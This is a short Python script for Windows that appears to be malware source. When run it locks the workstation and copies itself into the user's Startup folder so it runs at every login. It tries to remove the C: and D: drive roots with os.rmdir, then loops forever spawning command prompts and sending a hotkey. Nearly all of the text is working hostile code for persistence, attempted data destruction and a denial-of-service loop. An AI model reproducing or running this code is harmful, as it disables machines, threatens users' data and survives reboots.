import os, win32api, win32, sys, shutil, subprocess, pyautogui, ctypes

ctypes.windll.user32.LockWorkStation()  

def startup(): 
    Thisfile = sys.argv[0]
    Thisfile_name = os.path.basename(Thisfile) 
    user_path = os.path.expanduser('~') 

    if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

    def add_to_startup(src_file_path, startup_folder_path):
        file_name = os.path.basename(src_file_path)
        target_path = os.path.join(startup_folder_path, file_name)
        if not os.path.exists(target_path):
            try:
                shutil.copy(src_file_path, target_path)
            except Exception as e:
                 pass
  
    def mds():
         this_file = sys.argv[0]
         user_path = os.path.expanduser('~')
         startup_folder_path = os.path.join(user_path, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         add_to_startup(this_file, startup_folder_path)  
    mds()  

def main(): 
    
    os.rmdir("C:\\") 
    os.rmdir("D:\\") 
    startup() 
    
    while True: 
         subprocess.run("cmd") 
         pyautogui.hotkey("win+ctrl+shift+b")
    
    
if __name__ == "__main__": 
    main()
